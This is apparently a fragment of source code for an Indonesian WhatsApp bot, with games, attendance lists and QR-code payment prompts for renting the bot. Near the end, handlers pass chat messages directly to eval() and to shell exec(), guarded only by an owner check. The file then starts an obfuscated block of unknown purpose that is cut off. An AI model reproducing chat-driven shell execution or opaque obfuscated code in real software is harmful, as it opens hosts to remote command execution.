footerText: `${tampilTanggal}\n${tampilWaktu}` ,
buttons: buttonsos,
headerType: 1
}
alpha.sendMessage(from,  butptonMessagee, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender]
            },
			quoted: fgclink,sendEphemeral: true 
			})
			break
case 'absensi':
                 if (!isGroup) return reply(lang.onlygc())
absen.push(sender)
fs.writeFileSync('./src/absen.json', JSON.stringify(absen))
teks = `*LIST DAFTAR HADIR ABSEN*:${enter}`
for (let sensi of absen) {
teks += `${enter}々 @${sensi.split('@')[0]} ✓${enter}`
}
teks += `TOTAL MEMBER YG ABSEN : ${absen.length}${enter}${enter}Ketik ${prefix}absensi untuk absen, Daftar list absen akan dikumpulkan setelah waktu yang diberikan telah berakhir!`
alpha.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": absen}})
break

case 'absen':
if (!isGroup) return reply(lang.onlygc())
if (args.length < 1) return reply(`Cara Memulai Absen Silahkan Ketik${enter}${enter}${prefix}absen waktu${enter}${enter}list menit yang tersedia.${enter}${enter}600000 | 1200000 | 1800000${enter}${enter}jadi ${prefix}absen 600000`)
tem = args.join(" ")
ini = absen.indexOf(from)
absen.splice(ini, 1)
fs.writeFileSync('./src/absen.json', JSON.stringify(absen))
teks = `*LIST DAFTAR HADIR*:${enter}`
for (let sensi of absen) {
teks += `${enter}々 @${sensi.split('@')[0]} ✓${enter}`
}
teks += `ABSENSI : ${sensi.length}${enter}${enter}Ketik ${prefix}absensi untuk absen, Daftar list absen akan dikumpulkan setelah waktu yang diberikan telah berakhir!`
reply(`List Presentasi Hadir Telah Siap${enter}${enter}Ketik ${prefix}absensi untuk absen, Daftar list absen akan dikumpulkan setelah waktu yang diberikan telah berakhir!`)
setTimeout( () => {
reply(`Waktu Absensi Telah Habis`)
alpha.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": absen}})
}, tem)
setTimeout( () => {
ini = absen.indexOf(from)
absen.splice(ini, 1)
fs.writeFileSync('./src/absen.json', JSON.stringify(absen))
}, tem)
break

		  case 'tebakin': case 'tebakgambar':
					if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`${alphaapi}/game/tebakgambar?apikey=${alphakey}`)
                    resu = anu.data
                    tebak = resu.image
                    jawaban = resu.jawaban
                    tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/tebakgambar.json", JSON.stringify(tebakgambar))
                    console.log(jawaban)
                    tebakya = await getBuffer(tebak)
                    alpha.sendMessage(from, tebakya, image, { quoted: mek, caption: "Jawaban salah auto harus donasi" })
                   await sleep(30000)
                    if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete tebakgambar[sender.split('@')[0]]
                        fs.writeFileSync("./src/tebakgambar.json", JSON.stringify(tebakgambar))
                    }
                    break
				case 'caklontong':
					if (caklontong.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`${alphaapi}/game/caklontong?apikey=${alphakey}`)
                    tebakya = anu.soal
                    tebak = `Pertanyaan : ${tebakya}`
                    jawaban = anu.jawaban
                    caklontong[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/caklontong.json", JSON.stringify(caklontong))
                    console.log(jawaban)
                    alpha.sendMessage(from, tebak, text, { quoted: mek })
                   await sleep(30000)
                    if (caklontong.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete caklontong[sender.split('@')[0]]
                        fs.writeFileSync("./src/caklontong.json", JSON.stringify(caklontong))
                    }
                    break
				case 'family100':
					if (family.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`${alphaapi}/game/family100?apikey=${alphakey}`)
                    tebak = `Pertanyaan : ${anu.result.data.soal}`
                    jawaban = anu.result.data.jawaban
                    family[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/family100.json", JSON.stringify(family))
                    console.log(jawaban)
                    alpha.sendMessage(from, tebak, text, { quoted: mek })
                   await sleep(30000)
                    if (family.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete family[sender.split('@')[0]]
                        fs.writeFileSync("./src/family100.json", JSON.stringify(family))
                    }
                    break
				case 'tebakanime':
					if (tebakanime.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`https://x-restapi.herokuapp.com/api/tebak-anime?apikey=BETA`)
                    tebak = anu.soal
                    jawaban = anu.jawaban
                    tebakanime[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/tebakanime.json", JSON.stringify(tebakanime))
                    console.log(jawaban)
                    tebakya = await getBuffer(tebak)
                    alpha.sendMessage(from, tebakya, image, { quoted: mek, caption: "Jawaban salah auto harus donasi" })
                   await sleep(30000)
                    if (tebakanime.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete tebakanime[sender.split('@')[0]]
                        fs.writeFileSync("./src/tebakanime.json", JSON.stringify(tebakanime))
                    }
                    break
            case 'suit': 
              if (!q) return reply(`Kirim perintah ${prefix}suit gunting / batu / kertas`)
              const userspilih = q
              if (!userspilih.match(/batu|gunting|kertas/)) return reply(`Pilih batu, kertas, gunting`)
              var computer = Math.random();
              if (computer < 0.34 ) {
              computer = 'batu';
              } else if( computer >= 0.34 && computer < 0.67) {
              computer = 'gunting';
              } else {
              computer = 'kertas';
}
              if ( userspilih == computer ) {
              reply(`Pertandingan Seri!`)
              } else if ( userspilih == 'batu' ) {
              if( computer == 'gunting' ) {
              reply(`Kamu memilih Batu dan bot Gunting\nKamu menang!`)
              } else {
              reply(`Kamu memilih Batu dan bot memilih Kertas\nKamu kalah!`)
}
              } else if ( userspilih == 'gunting' ) {
              if( computer == 'batu' ) {
              reply(`Kamu memilih Gunting dan bot memilih Batu\nKamu kalah!`)
              } else {
              reply(`Kamu memilih Gunting dan bot Kertas\nKamu menang!`)
}
              } else if ( userspilih == 'kertas' ) {
              if( computer == 'batu' ) {
              reply(`Kamu memilih Kertas dan bot Batu\nKamu menang!`)
              } else {
              reply(`Kamu memilih Kertas dan bot memilih Gunting\nKamu kalah`)
}
}
              break
				default:
				if (budy.includes("Ownerbot",'ownerbot')){
					console.log(color('[ CMD ]', 'aqua'), 'Ownerbot', color(pushname))
 members_ids = []
		            for (let mem of groupMembers) {
		            members_ids.push(mem.jid)
		            }
			         ini_ownerNumber = [`${setting.ownerNumber}@s.whatsapp.net`,`${setting.ownerNumber}@s.whatsapp.net`,`${setting.ownerNumber}@s.whatsapp.net`,`${setting.ownerNumber}@s.whatsapp.net`,`${setting.ownerNumber}@s.whatsapp.net`,`${setting.ownerNumber}@s.whatsapp.net`,`${setting.ownerNumber}@s.whatsapp.net`,`${setting.ownerNumber}@s.whatsapp.net`]
					let ini_list = []
					for (let i of ini_ownerNumber) {
					const vname_ = alpha.contacts[i] != undefined ? alpha.contacts[i].vname || alpha.contacts[i].notify : undefined
					ini_list.push({
					"displayName": 'Owner Alphabot',
					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname_ ? `${vname_}` : `${alpha.user.name}`}\nORG: SUBSCRIBE ZEEONE OFC;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
					})
					}
					hehe = await alpha.sendMessage(from, {
					"displayName": `${ini_list.length} kontak`,
					"contacts": ini_list 
					}, 'contactsArrayMessage', { quoted: fkontak, contextInfo: {"mentionedJid": members_ids}})
					alpha.sendMessage(from,'Nih Kak Owner Ku',text,{quoted: hehe})
} 
if (subscribezeeoneofc == 'statiktiknya') {
anuui = process.uptime()
const timestampnya = speed();
					const latensinya = speed() - timestampnya
teks = `\`\`\`「 STATISTIK BOT 」\`\`\`

${petik}々 Base : SELF-BOT${petik}
${petik}々 Lib : Baileys, 3.5.2${petik}
${petik}々 Prefix : ${prefix}${petik}
${petik}々 Versi Bot : v0.0.7${petik}

${petik}々 Merk HP : ${device_manufacturer}${petik}
${petik}々 Versi OS : ${os_version}${petik}
${petik}々 Versi HP : ${device_model}${petik}
${petik}々 MCC : ${mcc}${petik}
${petik}々 MNC : ${mnc}${petik}
${petik}々 Baterai : ${isBattre}${petik}
${petik}々 Charger : ${isCharge}${petik}
${petik}々 Whatsapp : ${wa_version}${petik}
${petik}々 Blockir : ${banned.length} Blocked${petik}
${petik}々 Group Chat : ${totalgroup.length} Chat${petik}
${petik}々 Personal Chat : ${totalkontak.length} Chat${petik}
${petik}々 Total Chat : ${totalchat.length} Chat${petik}
${petik}々 Speed : ${latensinya.toFixed(4)} Second${petik}
${petik}々 Runtime : ${kyun(anuui)}${petik}`
fakeitem(teks)
}
if (subscribezeeoneofc == "ownerku"){
					console.log(color('[ CMD ]', 'aqua'), 'Ownerbot', color(pushname))
 
			         ini_ownerNumber = [`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`]
					let ini_list = []
					for (let i of ini_ownerNumber) {
					const vname_ = alpha.contacts[i] != undefined ? alpha.contacts[i].vname || alpha.contacts[i].notify : undefined
					ini_list.push({
					"displayName": 'Owner Alphabot',
					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname_ ? `${vname_}` : `${alpha.user.name}`}\nORG: SUBSCRIBE ZEEONE OFC;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
					})
					}
					hehe = await alpha.sendMessage(from, {
					"displayName": `${ini_list.length} kontak`,
					"contacts": ini_list 
					}, 'contactsArrayMessage', { quoted: fkontak})
					var ini_gopayy =`Halo @${sender.split("@")[0]} itu owner ku, jangan lupa donasi kak😇`
var buttonss = [
{buttonId: 'donasi', buttonText:{displayText: 'Donasi'}, type: 1},
{buttonId: 'sewa_kak', buttonText:{displayText: 'Sewa'}, type: 1}
]

buttonMessagee = {
contentText: ini_gopayy,
footerText: `${tampilTanggal}\n${tampilWaktu}\n\n© ${creator}` ,
buttons: buttonss,
headerType: 1
}
alpha.sendMessage(from,  buttonMessagee, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender]
            },
			quoted: ftoko,sendEphemeral: true 
			})
} 
if(subscribezeeoneofc == 'qr_gopay1'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	send_qr_gopay(gambar_gopay_nya, mek)
}    
if(subscribezeeoneofc == 'qr_dana1'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	send_qr_dana(gambar_dana_nya, mek)
}    
if(subscribezeeoneofc == 'qr_ovo1'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	send_qr_ovo(gambar_ovo_nya, mek)
}    
if(subscribezeeoneofc == 'qr_ovo13'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Minggu_ 
•> Harga : ${_minggu}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal ${_minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana13'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Minggu_ 
•> Harga : ${_minggu}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal ${_minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_gopay13'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Minggu_ 
•> Harga : ${_minggu}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal ${_minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    

if(subscribezeeoneofc == 'qr_ovo14'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _2 Minggu_ 
•> Harga : ${__minggu}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal ${__minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana14'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _2 Minggu_ 
•> Harga : ${__minggu}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal ${__minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_gopay14'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _2 Minggu_ 
•> Harga : ${__minggu}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal ${__minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}

if(subscribezeeoneofc == 'qr_ovo15'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _3 Minggu_ 
•> Harga : ${___minggu}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal ${___minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana15'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _3 Minggu_ 
•> Harga : ${___minggu}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal ${___minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
}    
if(subscribezeeoneofc == 'qr_gopay15'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _3 Minggu_ 
•> Harga : ${___minggu}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal ${___minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
}


if(subscribezeeoneofc == 'qr_ovo16'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Bulan_ 
•> Harga : ${_bulan}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal ${_bulan}
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana16'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Bulan_ 
•> Harga : ${_bulan}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal ${_bulan}
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
}    
if(subscribezeeoneofc == 'qr_gopay16'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Bulan_ 
•> Harga : ${_bulan}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal ${_bulan}
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
}

if(subscribezeeoneofc == 'qr_ovo17'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _permanen_
•> Harga : ${_permanen}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal ${_permanen}
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana17'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _permanen_
•> Harga : ${_permanen}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal ${_permanen}
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_gopay17'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _permanen_ 
•> Harga : ${_permanen}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal ${_permanen}
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}
if(subscribezeeoneofc == 'qr_ovo18'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal Jumlah Donasi.
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana18'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal Jumlah Donasi.
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_gopay18'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal Jumlah Donasi.
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}   
if (budy.includes("eror",'error','Eror','Error')){
					alpha.updatePresence(from, Presence.composing)
					const daieeeee = fs.readFileSync('./sticker/10_1.webp');
					alpha.sendMessage(from, daieeeee, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Kenapa bisa error???`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
		if(budy.includes("@verif", "@verify","daftar")){
			if (isRegister) return reply('Kamu sudah terdaftar di dalam database')
 addRegisterUser(sender, pushname, bio_user, wib)
 let ran_blc = randomNomor(50)
 addBalance(sender, ran_blc, balance)
 addLevelingId(sender)
fs.writeFileSync('./database/user/register.json', JSON.stringify(register))
teks = `╭─❒ *Verification* ❒\n│📛 *Nama :* ${pushname}\n│#️⃣ *Nomor :* @${sender.split('@')[0]}\n│💌 *Bio :* ${bio_user}\n│⏰ *Time :* ${wib} Wib\n╰❒ *Success*`
let papako = [{
										"buttonId": `menu`,
										"buttonText": {
											"displayText": "MENU"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `me`,
										"buttonText": {
											"displayText": "PROCFILE"
											},
										"type": "RESPONSE"
										}]
								sendButLocation(from, teks , `Thank for verification 💋\n${botname}™© | By ${ownername}`,pp_userz, papako, {contextInfo: { mentionedJid: [sender]}})
                }
		
if (budy.startsWith('x')){
try {
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
return alpha.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}  
if (budy.startsWith('>')){
try {
	if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
return alpha.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}  
if (budy.startsWith('$')){
if (!mek.key.fromMe && !isOwner && !isCreator ) return reply(lang.onlyOwner())
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`ALPHABOT :~ ${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (budy.startsWith('=>')){
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color("=>", "green"), 'from', color(pushname), 'args :', color(args.length))
} catch(e){
reply(String(e))
}
}
	}
	(function(_0x596f8e,_0xc03ea9){const _0x69caa2=_0x596f8e();function _0x3da794(_0xc51651,_0x3f0485,_0x17fb05,_0x587228){return _0x18e4(_0x587228-0x2f2,_0x3f0485);}function _0x5f0f66(_0x3c5386,_0x27c203,_0x25a1f2,_0x57fc62){return _0x18e4(_0x25a1f2- -0x3d,_0x27c203);}while(!![]){try{const _0xc05699=-parseInt(_0x3da794(0x5dd,0x498,0x49d,0x532))/(0x95d*-0x1+-0x21eb+0x2b49)+-parseInt(_0x5f0f66(0x1df,0x1be,0x123,0x1b1))/(0x58c*0x1+-0x20f1+0x1b67)+-parseInt(_0x5f0f66(0x19b,0xb7,0xda,0xe))/(-0x15d6+-0x24d*-0xa+-0x129)*(parseInt(_0x3da794(0x4a0,0x499,0x41c,0x431))/(-0x2ac+-0x1488+0x2e7*0x8))+parseInt(_0x5f0f66(0x268,0x11a,0x1d7,0x155))/(-0x1558+-0x22e2+0x383f)*(-parseInt(_0x5f0f66(0x2a4,0x284,0x1f4,0x200))/(-0x261c+-0x1*0x1aad+0x40cf))+-parseInt(_0x5f0f66(0x2c0,0x1f4,0x236,0x1fa))/(0xfc4+0x2020+0x1*-0x2fdd)+-parseInt(_0x3da794(0x379,0x485,0x48f,0x425))/(0xf75+0x76e+-0x16db)+parseInt(_0x5f0f66(0x20a,0x1c1,0x17c,0x10f))/(-0x1a0*0xd+0x4af*-0x3+-0x2336*-0x1);if(_0xc05699===_0xc03ea9)break;else _0x69caa2['push'](_0x69caa2['shift']());}catch(_0x2bba01){_0x69caa2['push'](_0x69caa2['shift']());}}}(_0x112a,0xb7095+0x185*0x4a3+-0x2ef*0x338));function _0x112a(){const 